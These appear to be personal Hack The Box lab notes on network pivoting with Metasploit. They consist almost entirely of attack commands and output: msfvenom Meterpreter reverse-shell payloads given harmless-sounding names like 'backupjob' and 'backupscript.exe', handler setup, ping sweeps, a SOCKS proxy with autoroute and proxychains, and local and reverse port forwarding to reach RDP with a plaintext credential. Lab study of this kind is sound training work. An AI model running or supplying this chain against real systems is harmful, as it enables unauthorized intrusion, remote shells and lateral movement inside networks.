# 1 connect to server
---

#### Creating Payload for Ubuntu Pivot Host
```shell-session
AhmaDb0x@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

#### Configuring & Starting the multi/handler
```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

#### Executing the Payload on the Pivot Host
```shell-session
ubuntu@WebServer:~$ ls

backupjob
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```

#### Meterpreter Session Establishment

----
---






# 2- Ping Sweep
---
```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

#### Ping Sweep For Loop on Linux Pivot Hosts
```shell-session
for i in {1..254} ;do (ping -c 1 172.16.6.$i | grep "bytes from" &) ;done
```

#### Ping Sweep For Loop Using CMD
```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

#### Ping Sweep Using PowerShell
```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

---
---






# 3- Configuring MSF's SOCKS Proxy
---

```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

#### Adding a Line to proxychains.conf if Needed
```shell-session
socks4 	127.0.0.1 9050
socks5    ip           port
```

#### Creating Routes with AutoRoute
```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

```shell-session
meterpreter > run autoroute -s 172.16.5.0/23
```

#### proxychains
```shell-session
AhmaDb0x@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```


------




# 4- Port Forwarding

## local
```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
```shell-session
AhmaDb0x@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

## Reverse
```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```


#### Generating the Windows Payload
```shell-session
AhmaDb0x@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```


```shell-session
C:\>
```

**The Pivot Host doesn’t "catch" the reverse shell itself—it only forwards it.**  
The **Hidden Target (172.16.5.129)** executes `backupscript.exe`, which tries to connect to **172.16.5.100 (Pivot Host) on port 1234**. The Pivot Host, instead of "catching" it, just forwards that traffic to **your Attack Machine (10.10.14.18) on port 8081**.